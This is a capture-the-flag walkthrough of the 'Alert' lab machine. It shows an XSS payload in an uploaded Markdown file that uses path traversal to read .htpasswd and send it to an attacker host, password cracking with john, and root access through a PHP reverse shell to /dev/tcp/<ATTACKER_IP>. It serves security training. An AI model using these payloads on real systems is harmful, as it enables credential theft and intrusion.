# Alert (Easy | Linux) — Write-up

## Reconnaissance

### Network Scanning

The machine enumeration begins with a standard Nmap scan:

```bash
nmap -A -sC <IP_ADDRESS>
```

Results:

```text
22/tcp open  ssh
80/tcp open  http
```

Two services are exposed:

* **SSH (22)**
* **HTTP (80)**

During web enumeration, the HTTP service reveals the hostname:

```text
alert.htb
```

Add it locally:

```bash
sudo nano /etc/hosts
```

Add:

```text
<IP_ADDRESS> alert.htb
```

---

## Web Enumeration

To discover additional virtual hosts:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/common.txt \
-u http://alert.htb \
-H "Host: FUZZ.alert.htb" -ac
```

Discovered subdomain:

```text
statistics.alert.htb
```

After adding it to `/etc/hosts`, both websites were inspected.

### Main Website

```text
http://alert.htb
```

The website exposes:

* A Markdown upload feature
* Shareable preview links
* A contact form mentioning that messages are reviewed by an administrator

### Statistics Subdomain

```text
http://statistics.alert.htb
```

Access is restricted and requires authentication.

---

## Initial Access

### Upload Feature Analysis

The Markdown upload feature appeared interesting for exploitation.

Initial testing focused on XSS but did not lead to successful exploitation.

Further analysis revealed that the upload and preview functionality could be abused to perform **path traversal** and retrieve arbitrary files from the server.

The objective became obtaining credentials from:

```text
/var/www/statistics.alert.htb/.htpasswd
```

Apache commonly stores authentication credentials inside `.htpasswd`.

A quick enumeration confirmed standard web directories:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
-fs 0 \
-u http://alert.htb/FUZZ
```

A malicious Markdown file was created:

```html
<script>
fetch(
"http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd"
)
.then(response => response.text())
.then(data => {
fetch(
"http://<ATTACKER_IP>:5555/?file_content=" +
encodeURIComponent(data)
);
});
</script>
```

This payload:

1. Retrieves `.htpasswd`
2. Sends the contents to the attacker server

Start a listener:

```bash
nc -lvnp 5555
```

Then send the generated preview link to the administrator through the contact form.

After the administrator opens the page, credentials are captured.

Received:

```text
<pre>
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

---

## Credential Recovery

The hash uses Apache MD5 format (`apr1`).

Save the hash locally and crack it:

```bash
john \
--wordlist=/usr/share/wordlists/rockyou.txt \
--format=md5crypt-long passwd
```

Recovered password:

```text
manchesterunited
```

---

## User Access

Connect via SSH:

```bash
ssh albert@alert.htb
```

Credentials:

```text
Username: albert
Password: manchesterunited
```

Once connected:

```bash
cat ~/user.txt
```

User flag obtained.

---

# Privilege Escalation

### Local Enumeration

During exploration, a writable directory was discovered:

```text
/opt/website-monitor/config/
```

This directory appeared to be used by an internal monitoring application.

Create a PHP reverse shell:

```php
<?php
exec(
"/bin/bash -c 'bash -i >/dev/tcp/<ATTACKER_IP>/8000 0>&1'"
);
?>
```

Save as:

```text
exploit.php
```

To access the internal service, establish SSH port forwarding:

```bash
ssh -L 8080:127.0.0.1:8080 albert@alert.htb
```

This forwards the remote service to the local machine.

Start a listener:

```bash
nc -lvnp 8000
```

Trigger execution:

```text
http://localhost:8080/config/exploit.php
```

A reverse shell is received.

Check privileges:

```bash
whoami
```

Output:

```text
root
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

---

# Conclusion

## Initial Access

* Enumerated HTTP services
* Identified a Markdown upload feature
* Exploited path traversal
* Retrieved Apache credentials
* Cracked password hash

## User Access

* Connected as `albert`
* Retrieved user flag

## Privilege Escalation

* Discovered exposed monitoring configuration
* Uploaded a PHP reverse shell
* Used SSH port forwarding
* Obtained root access

## Skills Practiced

* Web enumeration
* Virtual host discovery
* Path traversal
* Credential extraction
* Password cracking
* SSH tunneling
* Linux privilege escalation
